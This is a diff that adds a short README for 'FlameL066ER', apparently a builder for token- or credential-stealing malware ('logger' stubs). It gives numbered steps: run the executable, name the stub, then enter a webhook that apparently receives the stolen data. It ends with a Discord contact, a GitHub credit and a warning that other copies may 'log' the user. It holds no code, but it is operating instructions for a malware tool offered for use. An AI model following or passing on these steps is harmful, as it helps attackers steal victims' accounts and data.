@@ -1,0 +1,9 @@
+How to use stub builder.
+1# Run "FlameL066ER.exe"
+2# the logger should open and ask you for the stub name.
+3# select a name and press enter, after that it should ask for a webhook.
+4# input your webhook and it should be working
+IF YOU DO NOT FOLLOW THESE STEPS CORRECTLY IT WONT WORK!!
+IF ANY ISSUES DM : flame#7849
+CREDITS ❤️ : https://github.com/flamingflame 😈
+                                   !!!!THIS IS THE ONLY REAL FLAME LOGGER IF YOU GET ANOTHER ONE YOU MAY BE LOGGED!!!!!
